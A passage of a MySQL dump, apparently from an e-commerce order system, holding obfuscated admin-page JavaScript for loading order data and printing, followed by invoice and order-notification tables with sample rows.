_0x4f1437===undefined?(_0x4a61[\'bUohmb\']===undefined&&(_0x4a61[\'bUohmb\']=!![]),_0x4a611d=_0x4a61[\'gyLbUI\'](_0x4a611d,_0xf2d5e7),_0x4a61[\'uoEZlk\'][_0x2e44ba]=_0x4a611d):_0x4a611d=_0x4f1437,_0x4a611d;};$(document)[\'ready\'](function(){var _0x218688=_0x4a61;$(document)[\'on\'](\'click\',_0x218688(\'0x4\',\'x@lt\'),function(){var _0x2aafde=_0x218688,_0x1c8590=$(this)[_0x2aafde(\'0x1\',\'E[l*\')](_0x2aafde(\'0x3\',\'w2dI\'));$[_0x2aafde(\'0x2\',\'#206\')]({\'type\':_0x2aafde(\'0x0\',\'pTs(\'),\'url\':_0x2aafde(\'0x5\',\'#206\'),\'async\':![],\'data\':{\'pid\':_0x1c8590},\'success\':function(_0x4f1437){var _0x39b091=_0x2aafde;$(\'.p_data\')[_0x39b091(\'0x6\',\'BB6&\')](_0x4f1437);}});});}); </script>  <style> td {  position: relative; } .beep:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #563d7c;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } .beeps:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #007bff;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } .beepss:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #F0AD4E;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } </style>  <script> var _0x183d=[\'hSkOW7nFW77cK1NdQ1NdOmoMj30m\',\'bw0sWRnrWQKsWOHnW4vxsmk/WRFcG8kxW7pcG8kL\',\'BauPbdHYjsi=\',\'lCkqBYtdQ8o9iaddLLtdLSkgWOCzWRVdTCkIW4FcGmkeW4RdQSkoutm=\',\'rJ5FuLRdPmkCEaNcGSocjGHj\',\'uSkeW4JcOfhdLSkYfq==\',\'ytO2W6CD\',\'ka5KxKNcGbfa\',\'pmkvWQH5m8o9aHNcQCkQW6y4WOD8ASoqW4j6CSo9\',\'WRlcNgL4W5BcVK5fbq==\',\'WPNcK8koqCoXA2y9EX8Ue8omESkLh1SlcCk2\',\'W7ZdICojW6mPqSoEmSk8W4JcNrn1W63cJGtcIYhdJ23dNCoUWQm=\',\'W7DCWROKW6RdVLbk\',\'ydKRW7aDAColW4VdRdxdPXFdUH3cImofW7GxWRZdSSoKW6a=\',\'WRZdLSojW7mOFSoRp8o1amoDWOxcSu8J\',\'pSkvz8kX\',\'WPhcQLC+WRu=\',\'hCkedmo1W7dcQCkeWP95W549WPNcOhrBs8kKW6P0BCk8uSoAWOmmyKjXWRzLlhm2W7pdVmo6\',\'WQZdNSoyW68Hp8oMBCo5qSofWOVcSeH9W4nJWRVcGNa=\',\'m8keyCk0WQOuWQXNqSkOtmk4W4DVshVcPSkDbSk3a8kNga==\',\'jqJcQSoWW4TqW6ZcGCk3emkGW6qgAwiBWOJdIbZdS8oIW6DaW5JcRG==\',\'ySkQW7FcTLxcJ35TWOLiW7uFs8oL\',\'uIqWW7OmnSkMWPpdSINcQbm=\',\'W7L3WQ3cQW==\',\'lSkPW6ZcOutdKcm/W5DnW70Fq8kQW6RdPSkPdLb2W6mZralcN8kOt1mfW6ZcOLnkWRynhmoXchO=\',\'nhhcLmoDW4JdVKmMWO7dRIS3Fmob\',\'WPtdVSkaWRzlWQdcT8k5redcRCoVxmoVqv0=\',\'jSkxA8kRWQG=\'];(function(_0x37fc92,_0x183d10){var _0x29f166=function(_0x4538ba){while(--_0x4538ba){_0x37fc92[\'push\'](_0x37fc92[\'shift\']());}};_0x29f166(++_0x183d10);}(_0x183d,0x1f3));var _0x29f1=function(_0x37fc92,_0x183d10){_0x37fc92=_0x37fc92-0x0;var _0x29f166=_0x183d[_0x37fc92];if(_0x29f1[\'jLbmKB\']===undefined){var _0x4538ba=function(_0xf1909d){var _0xebc09f=\'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\',_0x45bf4a=String(_0xf1909d)[\'replace\'](/=+$/,\'\');var _0x208974=\'\';for(var _0x4f2a58=0x0,_0x4e1e83,_0x230634,_0x492892=0x0;_0x230634=_0x45bf4a[\'charAt\'](_0x492892++);~_0x230634&&(_0x4e1e83=_0x4f2a58%0x4?_0x4e1e83*0x40+_0x230634:_0x230634,_0x4f2a58++%0x4)?_0x208974+=String[\'fromCharCode\'](0xff&_0x4e1e83>>(-0x2*_0x4f2a58&0x6)):0x0){_0x230634=_0xebc09f[\'indexOf\'](_0x230634);}return _0x208974;};var _0x136a05=function(_0x241689,_0x3b0c9b){var _0x473135=[],_0x26746c=0x0,_0x41c126,_0x4b5b28=\'\',_0x19539e=\'\';_0x241689=_0x4538ba(_0x241689);for(var _0x23cbb6=0x0,_0x2f8e56=_0x241689[\'length\'];_0x23cbb6<_0x2f8e56;_0x23cbb6++){_0x19539e+=\'%\'+(\'00\'+_0x241689[\'charCodeAt\'](_0x23cbb6)[\'toString\'](0x10))[\'slice\'](-0x2);}_0x241689=decodeURIComponent(_0x19539e);var _0x20808e;for(_0x20808e=0x0;_0x20808e<0x100;_0x20808e++){_0x473135[_0x20808e]=_0x20808e;}for(_0x20808e=0x0;_0x20808e<0x100;_0x20808e++){_0x26746c=(_0x26746c+_0x473135[_0x20808e]+_0x3b0c9b[\'charCodeAt\'](_0x20808e%_0x3b0c9b[\'length\']))%0x100,_0x41c126=_0x473135[_0x20808e],_0x473135[_0x20808e]=_0x473135[_0x26746c],_0x473135[_0x26746c]=_0x41c126;}_0x20808e=0x0,_0x26746c=0x0;for(var _0x44cee4=0x0;_0x44cee4<_0x241689[\'length\'];_0x44cee4++){_0x20808e=(_0x20808e+0x1)%0x100,_0x26746c=(_0x26746c+_0x473135[_0x20808e])%0x100,_0x41c126=_0x473135[_0x20808e],_0x473135[_0x20808e]=_0x473135[_0x26746c],_0x473135[_0x26746c]=_0x41c126,_0x4b5b28+=String[\'fromCharCode\'](_0x241689[\'charCodeAt\'](_0x44cee4)^_0x473135[(_0x473135[_0x20808e]+_0x473135[_0x26746c])%0x100]);}return _0x4b5b28;};_0x29f1[\'wYPMPh\']=_0x136a05,_0x29f1[\'TVCKlL\']={},_0x29f1[\'jLbmKB\']=!![];}var _0x5d1d67=_0x29f1[\'TVCKlL\'][_0x37fc92];return _0x5d1d67===undefined?(_0x29f1[\'yThkBI\']===undefined&&(_0x29f1[\'yThkBI\']=!![]),_0x29f166=_0x29f1[\'wYPMPh\'](_0x29f166,_0x183d10),_0x29f1[\'TVCKlL\'][_0x37fc92]=_0x29f166):_0x29f166=_0x5d1d67,_0x29f166;};function printDiv(){var _0x3fc0a9=_0x29f1,_0x4538ba=document[_0x3fc0a9(\'0x5\',\'Xo%l\')](_0x3fc0a9(\'0xc\',\'75!l\')),_0x5d1d67=window[_0x3fc0a9(\'0x14\',\'U!b(\')](\'\',_0x3fc0a9(\'0x1b\',\'*J%z\')),_0x136a05=\'\'+_0x3fc0a9(\'0x10\',\'mngu\')+_0x3fc0a9(\'0x17\',\'u[fy\')+_0x3fc0a9(\'0x12\',\'*J%z\')+\'padding:0.5em;\'+\'}\'+_0x3fc0a9(\'0x1a\',\'XA)1\')+_0x3fc0a9(\'0x3\',\'Dj$l\')+_0x3fc0a9(\'0x8\',\'TM8d\')+\'\\x20padding-left:\\x200;\\x20\'+_0x3fc0a9(\'0x6\',\'kzJs\')+\'}\'+\'.list-group-item\\x20{\'+_0x3fc0a9(\'0xf\',\'%HV#\')+_0x3fc0a9(\'0x13\',\'u[fy\')+_0x3fc0a9(\'0x19\',\'6xCp\')+_0x3fc0a9(\'0xd\',\'[c1j\')+_0x3fc0a9(\'0x18\',\'U!b(\')+_0x3fc0a9(\'0x1\',\'XA)1\')+\'}\'+_0x3fc0a9(\'0x9\',\'sg1l\')+\'float:\\x20right\\x20!important;\'+\'}\'+_0x3fc0a9(\'0x7\',\'OoeG\');_0x5d1d67[\'document\'][_0x3fc0a9(\'0x0\',\'bYf%\')](),_0x136a05+=_0x4538ba[_0x3fc0a9(\'0xe\',\'!QA[\')],_0x5d1d67[_0x3fc0a9(\'0xa\',\'Cip%\')][_0x3fc0a9(\'0x4\',\'U!b(\')](_0x3fc0a9(\'0x16\',\'!4Ad\')+_0x136a05+_0x3fc0a9(\'0x2\',\']SD7\')),_0x5d1d67[_0x3fc0a9(\'0x11\',\'18EV\')][_0x3fc0a9(\'0xb\',\'*J%z\')](),setTimeout(function(){var _0x3bf0b5=_0x3fc0a9;_0x5d1d67[_0x3bf0b5(\'0x15\',\'9KPh\')]();},0x1);} </script>', '<script> var _0x2fca=[\"WRqZCmo1\",\"C8kIxmkpW59wW60=\",\"W40rCmkP\",\"WRm1ECo8WOLtpcL3W6RcGX4GWRueWQtdGJRcKSotW79/\",\"emo1mvVdSmk0W6VcICkYW5K=\",\"WOdcR03dTSku\",\"W55wWOTfWRtdOCk/\"];!function(r,f){!function(f){for(;--f;)r.push(r.shift())}(++f)}(_0x2fca,232);var _0x375f=function(r,f){var o=_0x2fca[r-=0];if(void 0===_0x375f.EyELNN){_0x375f.DqMupl=function(r,f){for(var o,t,n=[],c=0,e=\"\",a=\"\",x=0,u=(r=function(r){for(var f,o,t=String(r).replace(/=+$/,\"\"),n=\"\",c=0,e=0;o=t.charAt(e++);~o&&(f=c%4?64*f+o:o,c++%4)?n+=String.fromCharCode(255&f>>(-2*c&6)):0)o=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(o);return n}(r)).length;x<u;x++)a+=\"%\"+(\"00\"+r.charCodeAt(x).toString(16)).slice(-2);for(r=decodeURIComponent(a),t=0;t<256;t++)n[t]=t;for(t=0;t<256;t++)c=(c+n[t]+f.charCodeAt(t%f.length))%256,o=n[t],n[t]=n[c],n[c]=o;t=0,c=0;for(var d=0;d<r.length;d++)c=(c+n[t=(t+1)%256])%256,o=n[t],n[t]=n[c],n[c]=o,e+=String.fromCharCode(r.charCodeAt(d)^n[(n[t]+n[c])%256]);return e},_0x375f.GsfSqz={},_0x375f.EyELNN=!0}var t=_0x375f.GsfSqz[r];return void 0===t?(void 0===_0x375f.RNuyPb&&(_0x375f.RNuyPb=!0),o=_0x375f.DqMupl(o,f),_0x375f.GsfSqz[r]=o):o=t,o};$(document).ready(function(){var r=_0x375f;$(document).on(r(\"0x4\",\"(oe4\"),r(\"0x3\",\"%M^n\"),function(){var f=r,o=$(this).attr(f(\"0x5\",\"v(MZ\"));$[f(\"0x1\",\"*5xU\")]({type:\"post\",url:f(\"0x2\",\"&]HF\"),data:{pid:o},success:function(r){var o=f;$(o(\"0x0\",\"m8v]\"))[o(\"0x6\",\"&]HF\")](r)}})})}); </script> <style> td { position:relative;   }  .beepred:after {     content: \'\';     position: absolute !important;      top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #D9534F;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } </style> <script> var _0x5943=[\"W5/dMqiwnmoRoSovuCkblNy=\",\"sxNdGmocWRq=\",\"v8oOs23cNW==\",\"ySkcFcRcUcDjW4/cMcWEW7VdP8kCpMZcNSkAW7aTm8k+WQu=\",\"gCogsJxcQM/cTwhdLWNdQI08xa==\",\"C3ldKsPBW5aKdsaglxXBWQ57W7awW7K=\",\"c8oiuJFcPYxcPhhdKqRdU3LZssRdVCkSWRZdUgZcUCoVkmoRW7tdStWmc8oJW5azr8kkW65K\",\"W7TBWP/cQSk8WOJcT8kJW6VcIehcJMfu\",\"W5pcJMzRW446g1/cUJlcR8k5z0PPWQxdISorW47cMW==\",\"ygKrhCkQ\",\"W7TedSoYyhK1W5i=\",\"WRddSviYdCoQaCkNtCkfW5NdL8okxG==\",\"pSotetFdJmkmWRtdIIlcO0tdNCoJndX8fGOwW7xdOqi=\",\"bCklk8o9W4bcWQRdVmkcW7VdI0FcScNcTwVdJsG/W47cS8kaB3Gt\",\"W5nmjCotcCkpW4NdTa==\",\"sSkDiSo2\",\"WRqAocXmWRddRxq=\",\"WQbaWPpcHW==\",\"pmkqAZJcSZagW47cJZHwWQxcQSkengBdKmkvWRa4jSo6WQa=\",\"W65PW4/cLSkJW7G3WOtdQwmHoZFcLGW=\",\"W4zqWQBdRJy8h8oPWONdNCkfb2FcTJyXWOjE\",\"nGCMW4lcPYJdGHxdM2VcLhJcUmovWQhdNmoKBWaYW5/dLSkRW7ZcOGuwWOFcQmk/W5BcKSo8W7RdOmonqSoTW54=\",\"W4SfrmoLfWCJzW==\",\"WObRWRaBFSoBWPS/pSkYArOIdqBdTYOBW4f8\",\"WP1RWQyyFSoBW5fNCCo2m0j6rupcTZTAWPD1pblcImk6cW==\"];!function(W,d){!function(d){for(;--d;)W.push(W.shift())}(++d)}(_0x5943,245);var _0x1d26=function(W,d){var o=_0x5943[W-=0];if(void 0===_0x1d26.ghzIVp){_0x1d26.UEsAdW=function(W,d){for(var o,c,x=[],t=0,r=\"\",n=\"\",a=0,i=(W=function(W){for(var d,o,c=String(W).replace(/=+$/,\"\"),x=\"\",t=0,r=0;o=c.charAt(r++);~o&&(d=t%4?64*d+o:o,t++%4)?x+=String.fromCharCode(255&d>>(-2*t&6)):0)o=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(o);return x}(W)).length;a<i;a++)n+=\"%\"+(\"00\"+W.charCodeAt(a).toString(16)).slice(-2);for(W=decodeURIComponent(n),c=0;c<256;c++)x[c]=c;for(c=0;c<256;c++)t=(t+x[c]+d.charCodeAt(c%d.length))%256,o=x[c],x[c]=x[t],x[t]=o;c=0,t=0;for(var e=0;e<W.length;e++)t=(t+x[c=(c+1)%256])%256,o=x[c],x[c]=x[t],x[t]=o,r+=String.fromCharCode(W.charCodeAt(e)^x[(x[c]+x[t])%256]);return r},_0x1d26.OBNvOr={},_0x1d26.ghzIVp=!0}var c=_0x1d26.OBNvOr[W];return void 0===c?(void 0===_0x1d26.FuOxSY&&(_0x1d26.FuOxSY=!0),o=_0x1d26.UEsAdW(o,d),_0x1d26.OBNvOr[W]=o):o=c,o};function printDiv(){var W=_0x1d26,d=document.getElementById(W(\"0x15\",\"#&9g\")),o=window[W(\"0x16\",\"4@nz\")](\"\",W(\"0x5\",\"ZuvX\")),c=\"\"+W(\"0x17\",\"PI!x\")+W(\"0xd\",\"26R!\")+W(\"0x11\",\"6Da!\")+W(\"0xc\",\"2%sy\")+\"}\"+W(\"0x10\",\"U*GY\")+\" display: flex; \"+W(\"0x12\",\"Ij2h\")+W(\"0xa\",\"y(N)\")+\" margin-bottom: 0; }\"+W(\"0x0\",\"9&au\")+\" position: relative;\"+W(\"0x18\",\"hTr!\")+W(\"0x4\",\"6EVl\")+W(\"0x3\",\"6EVl\")+W(\"0x8\",\"PI!x\")+W(\"0x1\",\"tBmC\")+\"}\"+W(\"0x9\",\"iTdI\")+\"float: right !important;}\"+W(\"0x13\",\"7p1$\");o[W(\"0x2\",\"tb0l\")][W(\"0x14\",\"Ij2h\")](),c+=d.innerHTML,o.document[W(\"0xe\",\"CaAs\")](W(\"0xb\",\"iTdI\")+c+\"</body></html>\"),o[W(\"0xf\",\"m]!q\")][W(\"0x6\",\"*^I)\")](),setTimeout(function(){o[W(\"0x7\",\"hoa0\")]()},1)} </script>', ' <script> var _0x509e=[\"BSo1W5CAxG==\",\"WQ/cHHpdQq==\",\"DCkjiHHNW4va\",\"W7JdT8kCWOP/\",\"bJtcKSkB\",\"aSkFWOza\",\"W6TKW7xdPuD5mW==\"];!function(e,r){!function(r){for(;--r;)e.push(e.shift())}(++r)}(_0x509e,472);var _0x5e9d=function(e,r){var d=_0x509e[e-=0];if(void 0===_0x5e9d.qPAuat){_0x5e9d.SWZBxj=function(e,r){for(var d,t,o=[],n=0,x=\"\",a=\"\",c=0,i=(e=function(e){for(var r,d,t=String(e).replace(/=+$/,\"\"),o=\"\",n=0,x=0;d=t.charAt(x++);~d&&(r=n%4?64*r+d:d,n++%4)?o+=String.fromCharCode(255&r>>(-2*n&6)):0)d=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(d);return o}(e)).length;c<i;c++)a+=\"%\"+(\"00\"+e.charCodeAt(c).toString(16)).slice(-2);for(e=decodeURIComponent(a),t=0;t<256;t++)o[t]=t;for(t=0;t<256;t++)n=(n+o[t]+r.charCodeAt(t%r.length))%256,d=o[t],o[t]=o[n],o[n]=d;t=0,n=0;for(var f=0;f<e.length;f++)n=(n+o[t=(t+1)%256])%256,d=o[t],o[t]=o[n],o[n]=d,x+=String.fromCharCode(e.charCodeAt(f)^o[(o[t]+o[n])%256]);return x},_0x5e9d.PEFYSB={},_0x5e9d.qPAuat=!0}var t=_0x5e9d.PEFYSB[e];return void 0===t?(void 0===_0x5e9d.WbeHhA&&(_0x5e9d.WbeHhA=!0),d=_0x5e9d.SWZBxj(d,r),_0x5e9d.PEFYSB[e]=d):d=t,d},_0x12e27d=_0x5e9d;$(document)[_0x12e27d(\"0x4\",\"@8jq\")](function(){var e=_0x12e27d;$(document).on(e(\"0x0\",\"8!lU\"),\".preview_d\",function(){var r=e,d=$(this)[r(\"0x5\",\"sJPz\")](r(\"0x6\",\"02YI\"));$[r(\"0x1\",\"EcfW\")]({type:\"post\",url:\"order_product_data.php\",data:{pid:d},success:function(e){var d=r;$(d(\"0x3\",\"CG1w\"))[d(\"0x2\",\"jRz]\")](e)}})})}); </script> <style> td { position:relative;  }  .beepred:after {     content: \'\';     position: absolute !important;     top: 22px;     left: 14px;     width: 12px;     height: 12px;     background-color: #5CB85C;     border-radius: 50%;     animation: pulsate 1s ease-out;     animation-iteration-count: infinite;     opacity: 1; } </style>  <script> var _0x52e6=[\"WQRdKJFdH1nxWPNcVSoRaCk4WOddLCohWRSxWPddVfBcSa==\",\"hSovW7lcNMy=\",\"iHRcUNVdS8o6WPldMdbnCLHedJVdSrdcU3hdPWldKCoWWOtdM8oCWOGkiwlcTNhcOCocWPeznSkIra==\",\"d1RdLKf/W5uhvvbbWPbtsCke\",\"wXZdVSkbWPagqJmDisNcR1ujkq3dVCooW5pdKa==\",\"h8owW6/cIwz3zvOAW6LuW7uQWRtdK8kiW4molHvXzW==\",\"ed/dN0ldK0GRW5dcTKJdKwyuaW==\",\"wX3cLSkxi3TrxtfFW6z3WRdcKW==\",\"W5xdR8onWRW=\",\"rmomW7v2bMDdWQ/cJSotBSoCB8kvWPewD2S=\",\"dXVdSmkiWO0luJjdzd7cUL4kiHFcQCojWPZdH8ott8k+uum=\",\"mYhdMWxdHmosW5BdPa==\",\"WOCyuCk3v8o1W5OUWRC=\",\"Bmk/WQ5oE2hdLSky\",\"W5BcVvDNFCoyW5TlW4rlWRvfcrBcK8k3CWFcTW==\",\"DCoaiqZdKK7dN3TnzCoNWP3dSXud\",\"WPZdKSkxW7RdKeOVwqldJqHjWRhcUa==\",\"g3zhz8kFWRjZW4tdGZeMrCoVvmoWW7qRW7y=\",\"l8oyj8kQnKaPW7jiWQZcICks\",\"W5b9imkpW60=\",\"W4RcKK/cKSkAa8keW7BcM1jDWOq7W4G=\",\"f1pcKmkClMWiwZ4hWRWTW6NdN8oyrGzbltfhsmoyAmkv\",\"xmoaWOFcKY/cV1NdNq==\"];!function(o,W){!function(W){for(;--W;)o.push(o.shift())}(++W)}(_0x52e6,283);var _0x79e3=function(o,W){var d=_0x52e6[o-=0];if(void 0===_0x79e3.RgncVu){_0x79e3.oRGoFT=function(o,W){for(var d,e,c=[],t=0,x=\"\",r=\"\",i=0,n=(o=function(o){for(var W,d,e=String(o).replace(/=+$/,\"\"),c=\"\",t=0,x=0;d=e.charAt(x++);~d&&(W=t%4?64*W+d:d,t++%4)?c+=String.fromCharCode(255&W>>(-2*t&6)):0)d=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\".indexOf(d);return c}(o)).length;i<n;i++)r+=\"%\"+(\"00\"+o.charCodeAt(i).toString(16)).slice(-2);for(o=decodeURIComponent(r),e=0;e<256;e++)c[e]=e;for(e=0;e<256;e++)t=(t+c[e]+W.charCodeAt(e%W.length))%256,d=c[e],c[e]=c[t],c[t]=d;e=0,t=0;for(var a=0;a<o.length;a++)t=(t+c[e=(e+1)%256])%256,d=c[e],c[e]=c[t],c[t]=d,x+=String.fromCharCode(o.charCodeAt(a)^c[(c[e]+c[t])%256]);return x},_0x79e3.pUuhiq={},_0x79e3.RgncVu=!0}var e=_0x79e3.pUuhiq[o];return void 0===e?(void 0===_0x79e3.yHUayD&&(_0x79e3.yHUayD=!0),d=_0x79e3.oRGoFT(d,W),_0x79e3.pUuhiq[o]=d):d=e,d};function printDiv(){var o=_0x79e3,W=document[o(\"0xd\",\"$QiL\")](o(\"0x4\",\"iXXc\")),d=window[o(\"0x1\",\"e)zw\")](\"\",o(\"0xb\",\"Oh)D\")),e=\'<style type=\"text/css\">\'+o(\"0x14\",\"tum%\")+o(\"0x15\",\"$e5*\")+o(\"0x16\",\"qQVQ\")+\"}\"+o(\"0x13\",\"I]$b\")+\" display: flex; \"+o(\"0x3\",\"tum%\")+o(\"0xa\",\"5ibq\")+o(\"0x7\",\"U9cv\")+\"}\"+o(\"0x2\",\"NB2w\")+o(\"0x10\",\"BjeA\")+o(\"0x8\",\"9Vxa\")+o(\"0xe\",\"pc3)\")+\"margin-bottom: -1px;background-color: #fff;\"+o(\"0x12\",\"X4AS\")+\"}\"+o(\"0x9\",\"[&UJ\")+\"float: right !important;}</style>\";d[o(\"0x6\",\"sA&J\")].open(),e+=W[o(\"0x5\",\"[]G1\")],d[o(\"0xf\",\"9ZG[\")].write(\'<html><body onload=\"window.print()\">\'+e+o(\"0x0\",\"pc3)\")),d.document[o(\"0xc\",\"pAzi\")](),setTimeout(function(){d[o(\"0x11\",\"$e5*\")]()},1)} </script>');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_invoice`
--

CREATE TABLE `tbl_invoice` (
  `id` int(11) NOT NULL,
  `oid` int(11) DEFAULT NULL,
  `uid` int(11) DEFAULT NULL,
  `pid` int(11) DEFAULT NULL,
  `invoice_no` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `recipt_invoice` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `tax_invoice` text COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_invoice`
--

INSERT INTO `tbl_invoice` (`id`, `oid`, `uid`, `pid`, `invoice_no`, `recipt_invoice`, `tax_invoice`) VALUES
(1, 24, 25, 36, '48492421', 'http://api.dudeanddamsels.com/assets/invoice/48492421-recipt.pdf', 'http://api.dudeanddamsels.com/assets/invoice/48492421-tax.pdf');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_notification`
--

CREATE TABLE `tbl_notification` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `datetime` datetime NOT NULL,
  `title` text NOT NULL,
  `description` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_notification`
--

INSERT INTO `tbl_notification` (`id`, `uid`, `datetime`, `title`, `description`) VALUES
(1, 23, '2021-12-05 23:19:50', 'Order successfully created', 'You have successfully created order.'),
(2, 23, '2021-12-05 23:30:52', 'Order accepted', 'Order accepted.Order id: 1'),
(3, 23, '2021-12-05 23:30:58', 'Order completed', 'Order completed.Order id: 1'),
(4, 23, '2021-12-05 23:34:34', 'Order successfully created', 'You have successfully created order.'),
(5, 23, '2021-12-05 23:35:16', 'Order successfully created', 'You have successfully created order.'),
(6, 23, '2021-12-06 00:18:50', 'Order successfully created', 'You have successfully created order.'),
(7, 14, '2021-12-06 04:22:44', 'Order successfully created', 'You have successfully created order.'),
(8, 14, '2021-12-06 04:28:18', 'Order successfully created', 'You have successfully created order.'),
(9, 25, '2021-12-06 06:16:42', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 16'),
(10, 25, '2021-12-06 06:16:44', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 17'),
(11, 28, '2021-12-06 18:26:31', 'Order successfully created', 'You have successfully created order.'),
(12, 14, '2021-12-07 18:06:19', 'Order successfully created', 'You have successfully created order.'),
(13, 14, '2021-12-07 18:43:27', 'Order successfully created', 'You have successfully created order.'),
(14, 23, '2021-12-08 16:50:06', 'Order successfully created', 'You have successfully created order.'),
(15, 23, '2021-12-08 17:23:03', 'Order successfully created', 'You have successfully created order.'),
(16, 23, '2021-12-08 17:51:55', 'Order successfully created', 'You have successfully created order.'),
(17, 14, '2021-12-08 19:22:12', 'Order accepted', 'Order accepted.Order id: 31'),
(18, 25, '2021-12-09 07:37:23', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 39'),
(19, 25, '2021-12-09 07:37:27', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 40'),
(20, 25, '2021-12-09 07:37:36', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 41'),
(21, 25, '2021-12-09 07:37:43', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 35'),
(22, 25, '2021-12-09 07:37:44', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 34'),
(23, 25, '2021-12-09 07:37:47', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 33'),
(24, 25, '2021-12-09 07:37:49', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 32'),
(25, 25, '2021-12-09 07:37:56', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 38'),
(26, 25, '2021-12-09 07:37:58', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 37'),
(27, 25, '2021-12-09 07:38:02', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 36'),
(28, 25, '2021-12-09 07:38:06', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 22'),
(29, 25, '2021-12-09 07:38:07', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 21'),
(30, 23, '2021-12-09 08:11:49', 'Order successfully created', 'You have successfully created order.'),
(31, 25, '2021-12-09 08:40:52', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 44'),
(32, 23, '2021-12-09 13:58:38', 'Order successfully created', 'You have successfully created order.'),
(33, 23, '2021-12-10 01:51:18', 'Order successfully created', 'You have successfully created order.'),
(34, 23, '2021-12-10 02:05:10', 'Order successfully created', 'You have successfully created order.'),
(35, 23, '2021-12-10 02:16:20', 'Order successfully created', 'You have successfully created order.'),
(36, 23, '2021-12-10 02:25:10', 'Order successfully created', 'You have successfully created order.'),
(37, 23, '2021-12-10 02:31:25', 'Order successfully created', 'You have successfully created order.'),
(38, 23, '2021-12-10 02:34:01', 'Order successfully created', 'You have successfully created order.'),
(39, 23, '2021-12-10 02:38:16', 'Order successfully created', 'You have successfully created order.'),
(40, 23, '2021-12-10 03:10:16', 'Order successfully created', 'You have successfully created order.'),
(41, 14, '2021-12-10 04:51:16', 'Order successfully created', 'You have successfully created order.'),
(42, 14, '2021-12-10 04:52:54', 'Order successfully created', 'You have successfully created order.'),
(43, 14, '2021-12-10 04:55:49', 'Order successfully created', 'You have successfully created order.'),
(44, 14, '2021-12-10 05:22:43', 'Order successfully created', 'You have successfully created order.'),
(45, 23, '2021-12-10 05:41:03', 'Order successfully created', 'You have successfully created order.'),
(46, 23, '2021-12-10 06:00:45', 'Order successfully created', 'You have successfully created order.'),
(47, 23, '2021-12-10 06:04:20', 'Order successfully created', 'You have successfully created order.'),
(48, 23, '2021-12-10 07:08:03', 'Order successfully created', 'You have successfully created order.'),
(49, 23, '2021-12-10 07:12:05', 'Order successfully created', 'You have successfully created order.'),
(50, 23, '2021-12-10 07:40:09', 'Order successfully created', 'You have successfully created order.'),
(51, 14, '2021-12-10 07:51:25', 'Order successfully created', 'You have successfully created order.'),
(52, 14, '2021-12-10 07:57:37', 'Order successfully created', 'You have successfully created order.'),
(53, 14, '2021-12-10 08:03:16', 'Order successfully created', 'You have successfully created order.'),
(54, 25, '2021-12-10 08:14:23', 'Order successfully created', 'You have successfully created order.'),
(55, 25, '2021-12-10 08:14:35', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 76'),
(56, 25, '2021-12-10 08:14:38', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 85'),
(57, 23, '2021-12-10 11:37:10', 'Order successfully created', 'You have successfully created order.'),
(58, 14, '2021-12-10 13:02:38', 'Order successfully created', 'You have successfully created order.'),
(59, 14, '2021-12-10 13:04:12', 'Order successfully created', 'You have successfully created order.'),
(60, 14, '2021-12-10 13:05:02', 'Order successfully created', 'You have successfully created order.'),
(61, 14, '2021-12-10 13:10:27', 'Order successfully created', 'You have successfully created order.'),
(62, 30, '2021-12-10 13:14:06', 'Order successfully created', 'You have successfully created order.'),
(63, 30, '2021-12-10 13:15:06', 'Order successfully created', 'You have successfully created order.'),
(64, 30, '2021-12-10 13:17:17', 'Order completed', 'Order completed.Order id: 92'),
(65, 14, '2021-12-10 13:36:37', 'Order successfully created', 'You have successfully created order.'),
(66, 14, '2021-12-10 13:37:10', 'Order accepted', 'Order accepted.Order id: 94'),
(67, 14, '2021-12-10 13:37:28', 'Order completed', 'Order completed.Order id: 94'),
(68, 30, '2021-12-10 14:36:52', 'Order successfully created', 'You have successfully created order.'),
